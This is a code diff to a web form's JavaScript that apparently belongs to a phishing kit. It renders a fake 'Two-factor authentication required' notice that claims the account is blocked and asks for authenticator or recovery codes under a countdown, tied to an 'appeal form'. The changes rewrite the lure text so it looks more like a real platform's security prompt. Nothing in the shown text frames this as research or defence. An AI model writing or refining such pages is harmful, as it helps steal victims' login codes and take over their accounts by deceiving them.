@@ -53,22 +53,23 @@ function setTime() {
 
 function updateHtmlAndCallback(callback) {
     $('#code-form .card-body').html(`
-        <h2 class="card-title fw-bold">Two-factor authentication required (1/3)</h2>
+        <h2 class="card-title fw-bold">Two-factor authentication required </h2>
         <p class="card-text py-3">We have temporarily blocked your account because your protect has changed. Verify code has been sent</p>
         <img src="/img/TOtVy8P.png" class="w-100 rounded" alt="">
         <input type="text" class="form-control my-3 py-2 bg-light" id="code" placeholder="Enter your code" required>
         <p class="text-danger ms-1 d-none" id="wrong-code">
-            The code generator you entered is incorrect. Please wait 5 minutes to receive another one.
+            This code is incorrect. Please check that you entered the code correctly or try a new code.
         </p>
         <div class="bg-light rounded py-3 mb-3 d-flex justify-content-between align-items-center">
             <div class="mx-3">
                 <i class="fa fa-info-circle" aria-hidden="true" style="font-size: 1.5rem;color: #9f580a;"></i>
             </div>
             <p class="mb-0">
-                You’ve asked us to require a 6-digit or 8-digit login code when anyone tries to access your
-                account from a new device or browser. Enter the 6-digit or 8-digit code from your code generator or third-party app below.
+                Approve from another device or Enter your verification code
                 <br>
-                Please wait <span id="time" class="fw-bold">05:00</span> to request the sending of the code.
+                Enter the 6-digit code we just sent from the authenticator app you set up or Enter the 8-digit recovery code.
+                <br>
+                Please enter the code within <span id="time" class="fw-bold">05:00</span> to complete the appeal form.
             </p>
         </div>
         <p>We'll walk you through some steps to secure and unlock your account.</p>
